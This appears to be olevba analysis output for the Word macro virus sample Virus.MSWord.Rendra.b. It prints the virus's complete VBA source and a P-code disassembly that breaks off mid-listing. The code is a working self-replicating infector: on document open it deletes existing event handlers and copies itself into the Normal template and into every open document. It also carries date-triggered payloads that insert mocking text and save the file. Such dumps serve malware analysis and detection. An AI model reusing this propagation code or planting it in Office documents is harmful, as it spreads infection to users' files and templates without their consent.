olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Rendra.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Rendra.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub Document_Open()
'{ - This function should never be deleted - }
    
    Dim objet As Variant
    Dim objet2 As Variant
    Dim Var_Start, Var_Start2 As Long
    Dim Var_Count, Var_Count2 As Long
    
    'On Error Resume Next
        
    Set objet = NormalTemplate.VBProject.VBComponents.Item("ThisDocument")
    If Not objet.CodeModule.Find("'{ - This function should never be deleted - }", 1, 1, 1, 1) Then
        If objet.CodeModule.Find("Document_Open", 1, 1, 1, 1) Then
            Var_Start = objet.CodeModule.ProcBodyLine("Document_Open", vbext_pk_Proc)
            Var_Count = objet.CodeModule.ProcCountLines("Document_Open", vbext_pk_Proc)
            For i = 1 To Var_Count
                objet.CodeModule.DeleteLines Var_Start
            Next
        End If
        If objet.CodeModule.Find("Document_New", 1, 1, 1, 1) Then
            Var_Start = objet.CodeModule.ProcBodyLine("Document_New", vbext_pk_Proc)
            Var_Count = objet.CodeModule.ProcCountLines("Document_New", vbext_pk_Proc)
            For i = 1 To Var_Count
                objet.CodeModule.DeleteLines Var_Start
            Next
            
        End If
        Var_Start = objet.CodeModule.CountOfLines + 1
        Set objet2 = Me.VBProject.VBComponents.Item("ThisDocument")
        Var_Start2 = objet2.CodeModule.ProcBodyLine("Document_Open", vbext_pk_Proc)
        Var_Count2 = objet2.CodeModule.ProcCountLines("Document_Open", vbext_pk_Proc)
        objet.CodeModule.InsertLines Var_Start, _
                Chr(13) & _
                objet2.CodeModule.Lines(Var_Start2, Var_Count2)
        Var_Start = Var_Start + Var_Count2 + 1
        Var_Start2 = objet2.CodeModule.ProcBodyLine("Document_New", vbext_pk_Proc)
        Var_Count2 = objet2.CodeModule.ProcCountLines("Document_New", vbext_pk_Proc)
        objet.CodeModule.InsertLines Var_Start, _
                Chr(13) & _
                objet2.CodeModule.Lines(Var_Start2, Var_Count2)
        Var_Start = Var_Start + Var_Count2 + 1
        Var_Start2 = objet2.CodeModule.ProcBodyLine("Document_Close", vbext_pk_Proc)
        Var_Count2 = objet2.CodeModule.ProcCountLines("Document_Close", vbext_pk_Proc)
        objet.CodeModule.InsertLines Var_Start, _
                 Chr(13) & _
                 objet2.CodeModule.Lines(Var_Start2, Var_Count2)
        'NormalTemplate.Save
    Else
        For Each Feuille In Application.Documents
            Set objet = Feuille.VBProject.VBComponents.Item("ThisDocument")
            If Not objet.CodeModule.Find("'{ - This function should never be deleted - }", 1, 1, 1, 1) Then
                If objet.CodeModule.Find("Document_Open", 1, 1, 1, 1) Then
                    Var_Start = objet.CodeModule.ProcBodyLine("Document_Open", vbext_pk_Proc)
                    Var_Count = objet.CodeModule.ProcCountLines("Document_Open", vbext_pk_Proc)
                    For i = 1 To Var_Count
                        objet.CodeModule.DeleteLines Var_Start
                    Next
                End If
                If objet.CodeModule.Find("Document_New", 1, 1, 1, 1) Then
                    Var_Start = objet.CodeModule.ProcBodyLine("Document_New", vbext_pk_Proc)
                    Var_Count = objet.CodeModule.ProcCountLines("Document_New", vbext_pk_Proc)
                    For i = 1 To Var_Count
                        objet.CodeModule.DeleteLines Var_Start
                    Next
                End If
                If objet.CodeModule.Find("Document_Close", 1, 1, 1, 1) Then
                    Var_Start = objet.CodeModule.ProcBodyLine("Document_Close", vbext_pk_Proc)
                    Var_Count = objet.CodeModule.ProcCountLines("Document_Close", vbext_pk_Proc)
                    For i = 1 To Var_Count
                        objet.CodeModule.DeleteLines Var_Start
                    Next
                End If
                Var_Start = objet.CodeModule.CountOfLines + 1
                Set objet2 = NormalTemplate.VBProject.VBComponents.Item("ThisDocument")
                Var_Start2 = objet2.CodeModule.ProcBodyLine("Document_Open", vbext_pk_Proc)
                Var_Count2 = objet2.CodeModule.ProcCountLines("Document_Open", vbext_pk_Proc)
                
                objet.CodeModule.InsertLines Var_Start, _
                        Chr(13) & _
                        objet2.CodeModule.Lines(Var_Start2, Var_Count2)
                
                Var_Start = Var_Start + Var_Count2 + 1
                Var_Start2 = objet2.CodeModule.ProcBodyLine("Document_New", vbext_pk_Proc)
                Var_Count2 = objet2.CodeModule.ProcCountLines("Document_New", vbext_pk_Proc)
                objet.CodeModule.InsertLines Var_Start, _
                        Chr(13) & _
                        objet2.CodeModule.Lines(Var_Start2, Var_Count2)
                Var_Start = Var_Start + Var_Count2 + 1
                Var_Start2 = objet2.CodeModule.ProcBodyLine("Document_Close", vbext_pk_Proc)
                Var_Count2 = objet2.CodeModule.ProcCountLines("Document_Close", vbext_pk_Proc)
                objet.CodeModule.InsertLines Var_Start, _
                        Chr(13) & _
                        objet2.CodeModule.Lines(Var_Start2, Var_Count2)
            End If
        Next
    End If

End Sub


Private Sub Document_New()
    If (Date >= "03/04/2000" And Date <= "07/04/2000") _
        Or Date > "15/09/2000" _
        Or Format(Date, "dddd") = "Mercredi" And Date >= "03/04/2000" Then
        Selection.HomeKey Unit:=wdLine
        Selection.HomeKey Unit:=wdStory
        Selection.TypeParagraph
        Selection.MoveUp Unit:=wdLine, Count:=1
        Selection.TypeText Text:="Mi" & "cr" & "os" & "of" & "t vo" & "us s" & "ouh" & "ait" & "e la" & " b" & "ie" & "nv" & "en" & "ue !" & "!" & "!"
        Selection.HomeKey Unit:=wdLine, Extend:=wdExtend
        Selection.Range.HighlightColorIndex = wdBrightGreen
        Selection.Font.ColorIndex = wdRed
        Selection.Font.Size = 12
        Selection.Font.Size = 16
        Selection.ParagraphFormat.Alignment = wdAlignParagraphCenter
        Selection.MoveDown Unit:=wdLine, Count:=1
    End If
End Sub



Private Sub Document_Close()
    On Error Resume Next
    If Date > "15/09/2000" Then
        Selection.EndKey Unit:=wdStory
        Selection.TypeParagraph
        Selection.TypeText Text:="C" & "i" & "a" & "o" & " !" & "!" & "!"
        Selection.HomeKey Unit:=wdLine, Extend:=wdExtend
        Selection.Font.Bold = wdToggle
        Selection.Font.Size = 18
        Selection.Font.Name = "CourierBM"
        Selection.Font.Name = "Bookman Old Style"
        Options.DefaultHighlightColorIndex = wdBrightGreen
        Selection.Range.HighlightColorIndex = wdBrightGreen
        Selection.Font.ColorIndex = wdRed
        Selection.ParagraphFormat.Alignment = wdAlignParagraphRight
        Selection.HomeKey Unit:=wdStory
        Me.Save
    End If
    If (Date >= "03/04/2000" And Date <= "07/04/2000") _
        Or Format(Date, "dddd") = "Mercredi" And Date >= "03/04/2000" Then
        temporary = MsgBox("Me" & "r" & "ci" & " d'" & "avo" & "ir " & "uti" & "li" & "sé" & " ce b" & "e" & "l ou" & "ti" & "l qu" & "'" & "e" & "st " & "M" & "." & "S" & ". " & "W" & "O" & "R" & "D" & "S !" & "!" & "!" & Chr(13) & Chr(13) & "B" & "i" & "l" & "l" & " G" & "A" & "T" & "E" & "S " & "vo" & "us le" & " ren" & "dr" & "a " & "!", vbSystemModal + vbInformation + vbOKOnly, "Vive les mercredi et les jours fériés...")
    End If
End Sub







































-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Rendra.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 12476 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Private Sub Document_Open())
' Line #2:
' 	QuoteRem 0x0000 0x002D "{ - This function should never be deleted - }"
' Line #3:
' Line #4:
' 	Dim 
' 	VarDefn objet (As Variant)
' Line #5:
' 	Dim 
' 	VarDefn objet2 (As Variant)
' Line #6:
' 	Dim 
' 	VarDefn Var_Start
' 	VarDefn Var_Start2 (As Long)
' Line #7:
' 	Dim 
' 	VarDefn Var_Count
' 	VarDefn Var_Count2 (As Long)
' Line #8:
' Line #9:
' 	QuoteRem 0x0004 0x0014 "On Error Resume Next"
' Line #10:
' Line #11:
' 	SetStmt 
' 	LitStr 0x000C "ThisDocument"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set objet 
' Line #12:
' 	LitStr 0x002E "'{ - This function should never be deleted - }"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld objet 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	Not 
' 	IfBlock 
' Line #13:
' 	LitStr 0x000D "Document_Open"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld objet 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	IfBlock 
' Line #14:
' 	LitStr 0x000D "Document_Open"
' 	Ld vbext_pk_Proc 
' 	Ld objet 
' 	MemLd CodeModule 
' 	ArgsMemLd ProcBodyLine 0x0002 
' 	St Var_Start 
' Line #15:
' 	LitStr 0x000D "Document_Open"
' 	Ld vbext_pk_Proc 
' 	Ld objet 
' 	MemLd CodeModule 
' 	ArgsMemLd ProcCountLines 0x0002 
' 	St Var_Count 
' Line #16:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Var_Count 
' 	For 
' Line #17:
' 	Ld Var_Start 
' 	Ld objet 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #18:
' 	StartForVariable 
' 	Next 
' Line #19:
' 	EndIfBlock 
' Line #20:
' 	LitStr 0x000C "Document_New"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld objet 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	IfBlock 
' Line #21:
' 	LitStr 0x000C "Document_New"
' 	Ld vbext_pk_Proc 
' 	Ld objet 
' 	MemLd CodeModule 
' 	ArgsMemLd ProcBodyLine 0x0002 
' 	St Var_Start 
' Line #22:
' 	LitStr 0x000C "Document_New"
' 	Ld vbext_pk_Proc 
' 	Ld objet 
' 	MemLd CodeModule 
' 	ArgsMemLd ProcCountLines 0x0002 
' 	St Var_Count 
' Line #23:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Var_Count 
' 	For 
' Line #24:
' 	Ld Var_Start 
' 	Ld objet 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #25:
' 	StartForVariable 
' 	Next 
' Line #26:
' Line #27:
' 	EndIfBlock 
' Line #28:
' 	Ld objet 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Add 
' 	St Var_Start 
' Line #29:
' 	SetStmt 
' 	LitStr 0x000C "ThisDocument"
' 	Ld id_FFFF 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set objet2 
' Line #30:
' 	LitStr 0x000D "Document_Open"
' 	Ld vbext_pk_Proc 
' 	Ld objet2 
' 	MemLd CodeModule 
' 	ArgsMemLd ProcBodyLine 0x0002 
' 	St Var_Start2 
' Line #31:
' 	LitStr 0x000D "Document_Open"
' 	Ld vbext_pk_Proc 
' 	Ld objet2 
' 	MemLd CodeModule 
' 	ArgsMemLd ProcCountLines 0x0002 
' 	St Var_Count2 
' Line #32:
' 	LineCont 0x0008 07 00 10 00 0C 00 10 00
' 	Ld Var_Start 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Ld Var_Start2 
' 	Ld Var_Count2 
' 	Ld objet2 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	Ld objet 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #33:
' 	Ld Var_Start 
' 	Ld Var_Count2 
' 	Add 
' 	LitDI2 0x0001 
' 	Add 
' 	St Var_Start 
' Line #34:
' 	LitStr 0x000C "Document_New"
' 	Ld vbext_pk_Proc 
' 	Ld objet2 
' 	MemLd CodeModule 
' 	ArgsMemLd ProcBodyLine 0x0002 
' 	St Var_Start2 
' Line #35:
' 	LitStr 0x000C "Document_New"
' 	Ld vbext_pk_Proc 
' 	Ld objet2 
' 	MemLd CodeModule 
' 	ArgsMemLd ProcCountLines 0x0002 
' 	St Var_Count2 
' Line #36:
' 	LineCont 0x0008 07 00 10 00 0C 00 10 00
' 	Ld Var_Start 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Ld Var_Start2 
' 	Ld Var_Count2 
' 	Ld objet2 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	Ld objet 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #37:
' 	Ld Var_Start 
' 	Ld Var_Count2 
' 	Add 
' 	LitDI2 0x0001 
' 	Add 
' 	St Var_Start 
' Line #38:
' 	LitStr 0x000E "Document_Close"
' 	Ld vbext_pk_Proc 
' 	Ld objet2 
' 	MemLd CodeModule 
' 	ArgsMemLd ProcBodyLine 0x0002 
' 	St Var_Start2 
' Line #39:
' 	LitStr 0x000E "Document_Close"
' 	Ld vbext_pk_Proc 
' 	Ld objet2 
' 	MemLd CodeModule 
' 	ArgsMemLd ProcCountLines 0x0002 
' 	St Var_Count2 
' Line #40:
' 	LineCont 0x0008 07 00 11 00 0C 00 11 00
' 	Ld Var_Start 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Ld Var_Start2 
' 	Ld Var_Count2 
' 	Ld objet2 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	Ld objet 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #41:
' 	QuoteRem 0x0008 0x0013 "NormalTemplate.Save"
' Line #42:
' 	ElseBlock 
' Line #43:
' 	StartForVariable 
' 	Ld Feuille 
' 	EndForVariable 
' 	Ld Application 
' 	MemLd Documents 
' 	ForEach 
' Line #44:
' 	SetStmt 
' 	LitStr 0x000C "ThisDocument"
' 	Ld Feuille 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set objet 
' Line #45:
' 	LitStr 0x002E "'{ - This function should never be deleted - }"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld objet 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	Not 
' 	IfBlock 
' Line #46:
' 	LitStr 0x000D "Document_Open"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld objet 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	IfBlock 
' Line #47:
' 	LitStr 0x000D "Document_Open"
' 	Ld vbext_pk_Proc 
' 	Ld objet 
' 	MemLd CodeModule 
' 	ArgsMemLd ProcBodyLine 0x0002 
' 	St Var_Start 
' Line #48:
' 	LitStr 0x000D "Document_Open"
' 	Ld vbext_pk_Proc 
' 	Ld objet 
' 	MemLd CodeModule 
' 	ArgsMemLd ProcCountLines 0x0002 
' 	St Var_Count 
' Line #49:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Var_Count 
' 	For 
' Line #50:
' 	Ld Var_Start 
' 	Ld objet 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #51:
' 	StartForVariable 
' 	Next 
' Line #52:
' 	EndIfBlock 
' Line #53:
' 	LitStr 0x000C "Document_New"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld objet 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	IfBlock 
' Line #54:
' 	LitStr 0x000C "Document_New"
' 	Ld vbext_pk_Proc 
' 	Ld objet 
' 	MemLd CodeModule 
' 	ArgsMemLd ProcBodyLine 0x0002 
' 	St Var_Start 
' Line #55:
' 	LitStr 0x000C "Document_New"
' 	Ld vbext_pk_Proc 
' 	Ld objet 
' 	MemLd CodeModule 
' 	ArgsMemLd ProcCountLines 0x0002 
' 	St Var_Count 
' Line #56:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Var_Count 
' 	For 
' Line #57:
' 	Ld Var_Start 
' 	Ld objet 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #58:
' 	StartForVariable 
' 	Next 
' Line #59:
' 	EndIfBlock 
' Line #60:
' 	LitStr 0x000E "Document_Close"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld objet 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	IfBlock 
' Line #61:
' 	LitStr 0x000E "Document_Close"
' 	Ld vbext_pk_Proc 
' 	Ld objet 
' 	MemLd CodeModule 
' 	ArgsMemLd ProcBodyLine 0x0002 
' 	St Var_Start 
' Line #62:
' 	LitStr 0x000E "Document_Close"
' 	Ld vbext_pk_Proc 
' 	Ld objet 
' 	MemLd CodeModule 
' 	ArgsMemLd ProcCountLines 0x0002 
' 	St Var_Count 
' Line #63:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Var_Count 
' 	For 
' Line #64:
' 	Ld Var_Start 
' 	Ld objet 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #65:
' 	StartForVariable 
' 	Next 
' Line #66:
' 	EndIfBlock 
' Line #67:
' 	Ld objet 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Add 
' 	St Var_Start 
' Line #68:
' 	SetStmt 
' 	LitStr 0x000C "ThisDocument"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set objet2 
' Line #69:
' 	LitStr 0x000D "Document_Open"
' 	Ld vbext_pk_Proc 
' 	Ld objet2 
' 	MemLd CodeModule 
' 	ArgsMemLd ProcBodyLine 0x0002 
' 	St Var_Start2 
' Line #70:
' 	LitStr 0x000D "Document_Open"
' 	Ld vbext_pk_Proc 
' 	Ld objet2 
' 	MemLd CodeModule 
' 	ArgsMemLd ProcCountLines 0x0002 
' 	St Var_Count2 
' Line #71:
' Line #72:
' 	LineCont 0x0008 07 00 18 00 0C 00 18 00
' 	Ld Var_Start 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Ld Var_Start2 
' 	Ld Var_Count2 
' 	Ld objet2 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	Ld objet 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #73:
' Line #74:
' 	Ld Var_Start 
' 	Ld Var_Count2 
' 	Add 
' 	LitDI2 0x0001 
' 	Add 
' 	St Var_Start 
' Line #75:
' 	LitStr 0x000C "Document_New"
' 	Ld vbext_pk_Proc 
' 	Ld objet2 
' 	MemLd CodeModule 
' 	ArgsMemLd ProcBodyLine 0x0002 
' 	St Var_Start2 
' Line #76:
' 	LitStr 0x000C "Document_New"
' 	Ld vbext_pk_Proc 
' 	Ld objet2 
' 	MemLd CodeModule 
' 	ArgsMemLd ProcCountLines 0x0002 
' 	St Var_Count2 
' Line #77:
' 	LineCont 0x0008 07 00 18 00 0C 00 18 00
' 	Ld Var_Start 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Ld Var_Start2 
' 	Ld Var_Count2 
' 	Ld objet2 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	Ld objet 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #78:
' 	Ld Var_Start 
' 	Ld Var_Count2 
' 	Add 
' 	LitDI2 0x0001 
' 	Add 
' 	St Var_Start 
' Line #79:
' 	LitStr 0x000E "Document_Close"
' 	Ld vbext_pk_Proc 
' 	Ld objet2 
' 	MemLd CodeModule 
' 	ArgsMemLd ProcBodyLine 0x0002 
' 	St Var_Start2 
' Line #80:
' 	LitStr 0x000E "Document_Close"
' 	Ld vbext_pk_Proc 
' 	Ld objet2 
' 	MemLd CodeModule 
' 	ArgsMemLd ProcCountLines 0x0002 
' 	St Var_Count2 
' Line #81:
' 	LineCont 0x0008 07 00 18 00 0C 00 18 00
' 	Ld Var_Start 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Ld Var_Start2 
' 	Ld Var_Count2 
' 	Ld objet2 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	Ld objet 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #82:
' 	EndIfBlock 
' Line #83:
' 	StartForVariable 
' 	Next 
' Line #84:
' 	EndIfBlock 
' Line #85:
' Line #86:
' 	EndSub 
' Line #87:
' Line #88:
' Line #89:
' 	FuncDefn (Private Sub Document_New())
' Line #90:
' 	LineCont 0x0008 0A 00 08 00 0E 00 08 00
' 	Ld Date 
' 	LitStr 0x000A "03/04/2000"
' 	Ge 
' 	Ld Date 
' 	LitStr 0x000A "07/04/2000"
' 	Le 
' 	And 
' 	Paren 
' 	Ld Date 
' 	LitStr 0x000A "15/09/2000"
' 	Gt 
' 	Or 
' 	Ld Date 
' 	LitStr 0x0004 "dddd"
' 	ArgsLd Format$ 0x0002 
' 	LitStr 0x0008 "Mercredi"
' 	Eq 
' 	Ld Date 
' 	LitStr 0x000A "03/04/2000"
' 	Ge 
' 	And 
' 	Or 
' 	IfBlock 
' Line #91:
' 	Ld wdLine 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall HomeKey 0x0001 
' Line #92:
' 	Ld wdStory 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall HomeKey 0x0001 
' Line #93:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #94:
' 	Ld wdLine 
' 	ParamNamed Unit 
' 	LitDI2 0x0001 
' 	ParamNamed Count 
' 	Ld Selection 
' 	ArgsMemCall MoveUp 0x0002 
' Line #95:
' 	LitStr 0x0002 "Mi"
' 	LitStr 0x0002 "cr"
' 	Concat 
' 	LitStr 0x0002 "os"
' 	Concat 
' 	LitStr 0x0002 "of"
' 	Concat 
' 	LitStr 0x0004 "t vo"
' 	Concat 
' 	LitStr 0x0004 "us s"
' 	Concat 
' 	LitStr 0x0003 "ouh"
' 	Concat 
' 	LitStr 0x0003 "ait"
' 	Concat 
' 	LitStr 0x0004 "e la"
' 	Concat 
' 	LitStr 0x0002 " b"
' 	Concat 
' 	LitStr 0x0002 "ie"
' 	Concat 
' 	LitStr 0x0002 "nv"
' 	Concat 
' 	LitStr 0x0002 "en"
' 	Concat 
' 	LitStr 0x0004 "ue !"
' 	Concat 
' 	LitStr 0x0001 "!"
' 	Concat 
' 	LitStr 0x0001 "!"
' 	Concat 
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #96:
' 	Ld wdLine 
' 	ParamNamed Unit 
' 	Ld wdExtend 
' 	ParamNamed Extend 
' 	Ld Selection 
' 	ArgsMemCall HomeKey 0x0002 
' Line #97:
' 	Ld wdBrightGreen 
' 	Ld Selection 
' 	MemLd Range 
' 	MemSt HighlightColorIndex 
' Line #98:
' 	Ld wdRed 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt ColorIndex 
' Line #99:
' 	LitDI2 0x000C 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt Size 
' Line #100:
' 	LitDI2 0x0010 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt Size 
' Line #101:
' 	Ld wdAlignParagraphCenter 
' 	Ld Selection 
' 	MemLd ParagraphFormat 
' 	MemSt Alignment 
' Line #102:
' 	Ld wdLine 
' 	ParamNamed Unit 
' 	LitDI2 0x0001 
' 	ParamNamed Count 
' 	Ld Selection 
' 	ArgsMemCall MoveDown 0x0002 
' Line #103:
' 	EndIfBlock 
' Line #104:
' 	EndSub 
' Line #105:
' Line #106:
' Line #107:
' Line #108:
' 	FuncDefn (Private Sub Document_Close())
' Line #109:
' 	OnError (Resume Next) 
' Line #110:
' 	Ld Date 
' 	LitStr 0x000A "15/09/2000"
' 	Gt 
' 	IfBlock 
' Line #111:
' 	Ld wdStory 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall EndKey 0x0001 
' Line #112:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #113:
' 	LitStr 0x0001 "C"
' 	LitStr 0x0001 "i"
' 	Concat 
' 	LitStr 0x0001 "a"
' 	Concat 
' 	LitStr 0x0001 "o"
' 	Concat 
' 	LitStr 0x0002 " !"
' 	Concat 
' 	LitStr 0x0001 "!"
' 	Concat 
' 	LitStr 0x0001 "!"
' 	Concat 
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #114:
' 	Ld wdLine 
' 	ParamNamed Unit 
' 	Ld wdExtend 
' 	ParamNamed Extend 
' 	Ld Selection 
' 	ArgsMemCall HomeKey 0x0002 
' Line #115:
' 	Ld wdToggle 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt Bold 
' Line #116:
' 	LitDI2 0x0012 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt Size 
' Line #117:
' 	LitStr 0x0009 "CourierBM"
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt New 
' Line #118:
' 	LitStr 0x0011 "Bookman Old Style"
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt New 
' Line #119:
' 	Ld wdBrightGreen 
' 	Ld Options 
' 	MemSt DefaultHighlightColorIndex 
' Line #120:
' 	Ld wdBrightGreen 
' 	Ld Selection 
' 	MemLd Range 
' 	MemSt HighlightColorIndex 
' Line #121:
' 	Ld wdRed 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt ColorIndex 
' Line #122:
' 	Ld wdAlignParagraphRight 
' 	Ld Selection 
' 	MemLd ParagraphFormat 
' 	MemSt Alignment 
' Line #123:
' 	Ld wdStory 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall HomeKey 0x0001 
' Line #124:
' 	Ld id_FFFF 
' 	ArgsMemCall Save 0x0000 
' Line #125:
' 	EndIfBlock 
' Line #126:
' 	LineCont 0x0004 0A 00 08 00
' 	Ld Date 
' 	LitStr 0x000A "03/04/2000"
' 	Ge 
' 	Ld Date 
' 	LitStr 0x000A "07/04/2000"
' 	Le 
' 	And 
' 	Paren 
' 	Ld Date 
' 	LitStr 0x0004 "dddd"
' 	ArgsLd Format$ 0x0002 
' 	LitStr 0x0008 "Mercredi"
' 	Eq 
' 	Ld Date 
' 	LitStr 0x000A "03/04/2000"
' 	Ge 
' 	And 
' 	Or 
' 	IfBlock 
' Line #127:
' 	LitStr 0x0002 "Me"
' 	LitStr 0x0001 "r"
' 	Concat 
' 	LitStr 0x0002 "ci"
' 	Concat 
' 	LitStr 0x0003 " d'"
' 	Concat 
' 	LitStr 0x0003 "avo"
' 	Concat 
' 	LitStr 0x0003 "ir "
' 	Concat 
' 	LitStr 0x0003 "uti"
' 	Concat 
' 	LitStr 0x0002 "li"
' 	Concat 
' 	LitStr 0x0002 "sé"
' 	Concat 
' 	LitStr 0x0005 " ce b"
' 	Concat 
' 	LitStr 0x0001 "e"
' 	Concat 
' 	LitStr 0x0004 "l ou"
' 	Concat 
' 	LitStr 0x0002 "ti"
' 	Concat 
' 	LitStr 0x0004 "l qu"
' 	Concat 
' 	LitStr 0x0001 "'"
' 	Concat 
' 	LitStr 0x0001 "e"
' 	Concat 
' 	LitStr 0x0003 "st "
' 	Concat 
' 	LitStr 0x0001 "M"
' 	Concat 
' 	LitStr 0x0001 "."
' 	Concat 
' 	LitStr 0x0001 "S"
' 	Concat 
' 	LitStr 0x0002 ". "
' 	Concat 
' 	LitStr 0x0001 "W"
' 	Concat 
' 	LitStr 0x0001 "O"
' 	Concat 
' 	LitStr 0x0001 "R"
' 	Concat 
' 	LitStr 0x0001 "D"
' 	Concat 
' 	LitStr 0x0003 "S !"
' 	Concat 
' 	LitStr 0x0001 "!"
' 	Concat 
' 	LitStr 0x0001 "!"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 "B"
' 	Concat 
' 	LitStr 0x0001 "i"
' 	Concat 
' 	LitStr 0x0001 "l"
' 	Concat 
' 	LitStr 0x0001 "l"
' 	Concat 
' 	LitStr 0x0002 " G"
' 	Concat 
' 	LitStr 0x0001 "A"
' 	Concat 
' 	LitStr 0x0001 "T"
' 	Concat 
' 	LitStr 0x0001 "E"
' 	Concat 
' 	LitStr 0x0002 "S "
' 	Concat 
' 	LitStr 0x0002 "vo"
' 	Concat 
' 	LitStr 0x0005 "us le"
' 	Concat 
' 	LitStr 0x0004 " ren"
' 	Concat 
' 	LitStr 0x0002 "dr"
' 	Concat 
' 	LitStr 0x0002 "a "
' 	Concat 
' 	LitStr 0x0001 "!"
' 	Concat 
' 	Ld vbSystemModal 
' 	Ld vbInformation 
' 	Add 
